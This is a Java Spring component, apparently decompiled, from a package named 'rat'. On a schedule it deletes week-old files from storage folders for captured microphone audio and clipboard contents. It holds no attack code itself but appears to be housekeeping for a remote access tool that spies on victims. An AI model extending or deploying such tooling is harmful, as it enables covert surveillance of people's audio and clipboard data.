package com.example.rat;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.stream.Stream;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

@Component
public class MicClipboardCleanup {
   private static final long MAX_AGE_MS = 604800000L;

   @Scheduled(fixedDelayString = "${app.mic.cleanup.ms:21600000}", initialDelayString = "${app.mic.cleanup.initial:60000}")
   public void cleanup() {
      long cutoff = System.currentTimeMillis() - 604800000L;
      this.cleanupRoot(Paths.get("data", "mic"), cutoff);
      this.cleanupRoot(Paths.get("data", "clipboard"), cutoff);
   }

   private void cleanupRoot(Path root, long cutoff) {
      if (Files.isDirectory(root)) {
         try {
            Stream<Path> s = Files.list(root);

            try {
               s.forEach(p -> {
                  try {
                     File f = p.toFile();
                     if (f.lastModified() >= cutoff) {
                        return;
                     }

                     if (f.isDirectory()) {
                        this.deleteRecursive(p);
                     } else {
                        Files.deleteIfExists(p);
                     }
                  } catch (Exception var5) {
                  }
               });
            } catch (Throwable var8) {
               if (s != null) {
                  try {
                     s.close();
                  } catch (Throwable var7) {
                     var8.addSuppressed(var7);
                  }
               }

               throw var8;
            }

            if (s != null) {
               s.close();
            }
         } catch (Exception var9) {
         }
      }
   }

   private void deleteRecursive(Path dir) {
      try {
         Stream<Path> walk = Files.walk(dir);

         try {
            walk.sorted(Comparator.reverseOrder()).forEach(x -> {
               try {
                  Files.deleteIfExists(x);
               } catch (Exception var2x) {
               }
            });
         } catch (Throwable var6) {
            if (walk != null) {
               try {
                  walk.close();
               } catch (Throwable var5) {
                  var6.addSuppressed(var5);
               }
            }

            throw var6;
         }

         if (walk != null) {
            walk.close();
         }
      } catch (Exception var7) {
      }
   }
}
